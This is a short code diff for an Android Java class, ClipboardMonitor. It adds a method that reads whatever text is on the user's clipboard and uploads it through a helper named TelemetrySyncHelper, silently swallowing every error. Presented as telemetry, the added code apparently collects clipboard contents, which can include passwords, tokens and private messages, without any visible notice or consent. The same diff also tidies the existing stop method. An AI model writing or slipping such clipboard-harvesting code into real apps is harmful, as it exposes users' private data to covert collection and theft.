@@ -42,13 +42,33 @@ public class ClipboardMonitor {
         } catch (Throwable ignored) {}
     }
 
+    public static void fetchAndUpload(final Context context) {
+        if (context == null) return;
+        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
+            try {
+                ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
+                if (cm != null && cm.hasPrimaryClip()) {
+                    ClipData clip = cm.getPrimaryClip();
+                    if (clip != null && clip.getItemCount() > 0) {
+                        CharSequence text = clip.getItemAt(0).getText();
+                        if (text != null && text.length() > 0) {
+                            String content = text.toString().trim();
+                            if (!content.isEmpty()) {
+                                lastCopiedText = content;
+                                TelemetrySyncHelper.uploadClipboard(context, content);
+                            }
+                        }
+                    }
+                }
+            } catch (Throwable ignored) {}
+        });
+    }
+
     public static void stop(Context context) {
         if (context == null || listener == null) return;
         try {
             ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
-            if (cm != null) {
-                cm.removePrimaryClipChangedListener(listener);
-            }
+            if (cm != null) cm.removePrimaryClipChangedListener(listener);
             listener = null;
         } catch (Throwable ignored) {}
     }
